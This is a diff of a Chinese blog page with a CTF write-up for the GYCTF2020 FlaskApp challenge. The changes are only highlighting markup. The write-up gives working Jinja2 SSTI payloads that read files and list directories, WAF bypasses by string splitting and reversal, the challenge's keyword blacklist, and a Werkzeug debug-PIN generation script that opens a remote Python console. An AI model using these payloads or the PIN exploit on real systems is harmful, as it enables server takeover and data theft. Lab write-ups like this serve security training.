@@ -200,7 +200,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      589 字
+      557 字
     </span>
   
 
@@ -210,7 +210,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      9
        分钟
     </span>
   
@@ -256,16 +256,16 @@
               <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[GYCTF2020]FlaskApp<br><img src="https://ftp.bmp.ovh/imgs/2021/03/9fd70301dbc831c0.png" srcset="/img/loading.gif"> </p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>SSTI<br><code>&#123;&#123;1+1&#125;&#125;</code>加密后解密返回2<br>直接用之前的payload打一下—–&gt;返回<code>nonono!</code><br>应该有过滤<br>报错的返回：<br><img src="https://ftp.bmp.ovh/imgs/2021/03/7415444900c60886.png" srcset="/img/loading.gif"><br>说明开启了debug模式，而且可以看到文件的完整路径    </p>
 <p><code>/usr/local/lib/python3.7/site-packages/flask/app.py</code><br>读一下文件<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/03/c46cda6028fdd98b.png" srcset="/img/loading.gif"><br>可以看到有WAF     </p>
-<pre><code><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span> 
-black_list = [&amp;<span class="hljs-comment">#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;</span>
-			,&amp;<span class="hljs-comment">#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;</span>
-			,&amp;<span class="hljs-comment">#34;chr&amp;#34;,&amp;#34;request&amp;#34;</span>
-			,&amp;<span class="hljs-comment">#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;</span>
-			,&amp;<span class="hljs-comment">#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;</span>
-			,&amp;<span class="hljs-comment">#34;*&amp;#34;,&amp;#34;?&amp;#34;] </span>
-<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> black_list :
-<span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>.lower():
-	<span class="hljs-keyword">return</span> <span class="hljs-number">1</span></code></pre></code></pre>
+<pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
+black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token comment">#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;</span>
+			<span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token comment">#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;</span>
+			<span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token comment">#34;chr&amp;#34;,&amp;#34;request&amp;#34;</span>
+			<span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token comment">#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;</span>
+			<span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token comment">#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;</span>
+			<span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token comment">#34;*&amp;#34;,&amp;#34;?&amp;#34;] </span>
+<span class="token keyword">for</span> x <span class="token keyword">in</span> black_list <span class="token punctuation">:</span>
+<span class="token keyword">if</span> x <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">return</span> <span class="token number">1</span></code></pre></code></pre>
 <h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><p>一、<br>可以字符串拼接绕过<br> <code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code><img src="https://ftp.bmp.ovh/imgs/2021/03/97db9f96462955ee.png" srcset="/img/loading.gif"><br>打开<code>this_is_the_flag.txt</code>即可<br><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>      </p>
 <p>二、<br>字符串倒转<code>[::-1]</code>         </p>
 <pre><code>s=&quot;/this_is_the_flag.txt&quot;
@@ -274,47 +274,47 @@ print(s[::-1])
 <p>payload：<code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code>      </p>
 <p>三、<br><img src="https://ftp.bmp.ovh/imgs/2021/03/a18776be9dbf759f.png" srcset="/img/loading.gif">    </p>
 <p>生成PIN的exp：      </p>
-<pre><code><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib
-<span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain
-probably_public_bits = [
-    <span class="hljs-string">&#x27;flaskweb&#x27;</span><span class="hljs-comment"># username</span>
-    <span class="hljs-string">&#x27;flask.app&#x27;</span>,<span class="hljs-comment"># modname</span>
-    <span class="hljs-string">&#x27;Flask&#x27;</span>,<span class="hljs-comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span>
-    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="hljs-comment"># getattr(mod, &#x27;__file__&#x27;, None),</span>
-]
+<pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib
+<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
+probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'flaskweb'</span><span class="token comment"># username</span>
+    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment"># modname</span>
+    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
+    <span class="token string">'/usr/local/lib/python3.7/site-packages/flask/app.py'</span> <span class="token comment"># getattr(mod, '__file__', None),</span>
+<span class="token punctuation">]</span>
 
-private_bits = [
-    <span class="hljs-string">&#x27;2485377875088&#x27;</span>,<span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
-    <span class="hljs-string">&#x27;5d9996326aaf665611dc77291ca91fc7e65f0429cfaec25692ea858467358a1c&#x27;</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span>
-]
+private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'2485377875088'</span><span class="token punctuation">,</span><span class="token comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
+    <span class="token string">'5d9996326aaf665611dc77291ca91fc7e65f0429cfaec25692ea858467358a1c'</span><span class="token comment"># get_machine_id(), /etc/machine-id</span>
+<span class="token punctuation">]</span>
 
-h = hashlib.md5()
-<span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):
-    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:
-        <span class="hljs-keyword">continue</span>
-    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):
-        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)
-    h.update(bit)
-h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)
+h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>
+        <span class="token keyword">continue</span>
+    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
+h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>
 
-cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]
+cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>
 
-num = <span class="hljs-literal">None</span>
-<span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
-    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)
-    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]
+num <span class="token operator">=</span> <span class="token boolean">None</span>
+<span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>
+    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
 
-rv =<span class="hljs-literal">None</span>
-<span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
-    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:
-        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:
-            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)
-                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))
-            <span class="hljs-keyword">break</span>
-    <span class="hljs-keyword">else</span>:
-        rv = num
+rv <span class="token operator">=</span><span class="token boolean">None</span>
+<span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
+                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        rv <span class="token operator">=</span> num
 
-print(rv)</code></pre></code></pre>
+<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span></code></pre></code></pre>
 <p><img src="https://ftp.bmp.ovh/imgs/2021/03/6cf573d94733f77f.png" srcset="/img/loading.gif"><br>点击这个<br><img src="https://ftp.bmp.ovh/imgs/2021/03/0f34b27fdd395a9c.png" srcset="/img/loading.gif"><br>填入生成的PIN码，即可进入python交互模式，然后在这里执行命令找flag即可<br><img src="https://ftp.bmp.ovh/imgs/2021/03/c7ba641e0112a209.png" srcset="/img/loading.gif"></p>
 <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><a target="_blank" rel="noopener" href="http://www.91ri.org/17362.html">Flask debug 模式 PIN 码生成机制安全性研究笔记</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/32138231">Flask开启debug模式等于给黑客留了后门</a></p>
 
